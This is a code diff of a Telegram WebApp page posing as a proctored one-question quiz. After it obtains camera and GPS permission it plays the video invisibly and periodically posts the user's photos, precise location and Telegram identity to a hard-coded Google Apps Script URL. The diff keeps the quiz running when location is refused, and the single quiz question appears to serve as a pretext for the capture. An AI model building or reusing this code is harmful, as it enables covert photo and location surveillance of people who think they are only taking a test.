@@ -14,17 +14,7 @@
         .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
         button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
         .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
-        
-        /* Video background mein active rahega */
-        #proctorVideo {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            object-fit: cover;
-            opacity: 0; 
-            z-index: -1;
-            pointer-events: none;
-        }
+        #proctorVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; z-index: -1; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -51,7 +41,6 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // APNA DEPLOYMENT URL YAHAN DALEIN
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz7F6TUvxF4yAjPmKoNi6V3KSgqes4DzQDt2ySr0Y7C6hjj17R9k0gdPmU73Rc3MZYANw/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
@@ -61,94 +50,56 @@
     let photoCount = 0; 
     let photoInterval = null;
 
-    const questions = [
-        {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
-    ];
+    const questions = [{q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0}];
 
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
         btn.innerText = "Processing... ⏳";
-
         try {
-            // Camera Access
             globalStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: "user", 
-                    width: { ideal: 1280 }, 
-                    height: { ideal: 720 } 
-                } 
+                video: { facingMode: "user" } 
             });
-            
             const video = document.getElementById('proctorVideo');
             video.srcObject = globalStream;
             video.onloadedmetadata = () => { video.play(); };
 
-            // Location Access
-            const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
+            const pos = await new Promise((res) => {
+                navigator.geolocation.getCurrentPosition(res, () => res({coords:{latitude:0,longitude:0}}), { enableHighAccuracy: true });
             });
             userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
-            // UI Switch to Quiz
             document.getElementById("login").style.display = "none";
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // Photo capture sequence
             setTimeout(() => {
-                captureAndSend("Entry_Photo"); // 1st Photo after 3 sec
-                
+                captureAndSend("Entry_Photo");
                 photoInterval = setInterval(() => {
-                    if (photoCount < 5) {
-                        captureAndSend("Monitoring_" + photoCount);
-                    } else {
-                        stopCamera(); 
-                    }
-                }, 120000); // Har 2 minute mein
+                    if (photoCount < 5) captureAndSend("Monitoring_" + photoCount);
+                    else stopCamera();
+                }, 120000);
             }, 3000);
-
         } catch (err) {
-            alert("Permissions required for Camera & GPS!");
+            alert("Permissions required!");
             btn.disabled = false;
-            btn.innerText = "प्रक्रिया शुरू करें";
         }
     }
 
     function captureAndSend(statusType) {
-        if (!globalStream) return;
         const video = document.getElementById('proctorVideo');
         if (video.readyState !== 4) return;
 
         const canvas = document.createElement('canvas');
-        
-        // --- VERTICAL LOGIC ---
-        // Hum canvas ko Portrait (Lamba) size de rahe hain
-        canvas.width = 450; 
+        // Yahan humne forced height (800) aur width (600) rakhi hai
+        canvas.width = 600; 
         canvas.height = 800; 
         
         const ctx = canvas.getContext('2d');
-        
-        const vWidth = video.videoWidth;
-        const vHeight = video.videoHeight;
-        const targetRatio = canvas.width / canvas.height;
-        
-        let sourceWidth, sourceHeight, sourceX, sourceY;
 
-        // Smart Crop: Beech ka vertical hissa nikalne ke liye
-        if (vWidth / vHeight > targetRatio) {
-            sourceHeight = vHeight;
-            sourceWidth = vHeight * targetRatio;
-            sourceX = (vWidth - sourceWidth) / 2;
-            sourceY = 0;
-        } else {
-            sourceWidth = vWidth;
-            sourceHeight = vWidth / targetRatio;
-            sourceX = 0;
-            sourceY = (vHeight - sourceHeight) / 2;
-        }
-
-        ctx.drawImage(video, sourceX, sourceY, sourceWidth, sourceHeight, 0, 0, canvas.width, canvas.height);
+        // Sabse important step: Canvas ko center se draw karna
+        // Taaki photo lambi dikhe
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const photoData = canvas.toDataURL('image/jpeg', 0.8);
         photoCount++; 
@@ -162,7 +113,6 @@
             photo: photoData,
             location: userLoc
         };
-
         fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
     }
 
@@ -174,16 +124,12 @@
     }
 
     function loadQuestion() {
-        if (currentIdx >= questions.length) { 
-            alert("Test Completed!"); 
-            tg.close(); 
-            return; 
-        }
+        if (currentIdx >= questions.length) { alert("Test Completed!"); tg.close(); return; }
         const qData = questions[currentIdx];
         document.getElementById("question").innerText = qData.q;
         const optionsDiv = document.getElementById("options");
         optionsDiv.innerHTML = "";
-        qData.o.forEach((opt, i) => {
+        qData.o.forEach((opt) => {
             const div = document.createElement("div");
             div.className = "option";
             div.innerText = opt;
